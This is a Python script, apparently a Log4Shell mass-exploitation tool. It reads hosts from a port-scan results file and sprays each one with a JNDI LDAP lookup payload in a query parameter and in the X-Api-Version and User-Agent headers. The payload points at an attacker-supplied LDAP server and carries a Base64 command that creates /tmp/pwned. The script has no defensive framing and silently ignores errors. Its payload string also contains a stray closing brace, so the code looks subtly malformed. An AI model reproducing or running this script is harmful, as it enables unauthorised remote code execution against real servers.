#! /bin/python

import os
import requests
import sys

file = open(sys.argv[1], 'r')
datas = file.read().splitlines()
payload= '${jndi:ldap://'+sys.argv[2]+'}:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

for data in datas:
    data=data.split()
    if data[3]=="80/tcp":
        uri=data[5]
        uri='http://{DOMIN}/'.format(DOMIN=uri)
        
        try:
            response = requests.get(
                uri,
                timeout=2,
                params={'q': payload},
                headers={ 'content-type': 'application/json' ,'X-Api-Version': payload , 'User-Agent' : payload },
            )
        except: 
            pass
    else:
        uri=data[5]
        uri='https://{DOMIN}/'.format(DOMIN=uri)
        try:
            response = requests.get(
                uri,
                verify=False,
                timeout=2,
                params={'q': payload},
                headers={ 'content-type': 'application/json' ,'X-Api-Version': payload , 'User-Agent' : payload },
            ) 
        except: 
            pass
